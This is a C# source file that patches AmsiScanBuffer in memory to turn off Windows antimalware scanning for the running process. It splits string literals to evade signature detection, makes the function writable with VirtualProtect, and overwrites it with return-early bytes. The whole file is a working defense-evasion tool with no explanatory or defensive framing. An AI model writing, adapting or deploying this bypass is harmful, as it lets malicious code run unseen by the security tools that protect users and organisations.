using System;
using System.Runtime.InteropServices;

public class A_S_M_A
{
    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80 };

    public static void Bypass()
    {
        if (is64Bit())
            Patch(x64);
    }

    public static byte[] addByteToArray(byte[] bArray, byte newByte)
    {
        byte[] newArray = new byte[bArray.Length + 1];
        bArray.CopyTo(newArray, 1);
        newArray[0] = newByte;
        return newArray;
    }

    private static void Patch(byte[] _patch)
    {
        try
        {
            var lib = Win32.LoadLibrary("am"+"si.dll");
            var addr = Win32.GetProcAddress(lib, "Ams"+"iScanBu"+"ffer");

            byte[] patch = addByteToArray(_patch, 0xC3);

            uint oldProtect;
            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, addr, patch.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [-] {0}", e.Message);
            Console.WriteLine(" [-] {0}", e.InnerException);
        }
    }

    private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
}

class Win32
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}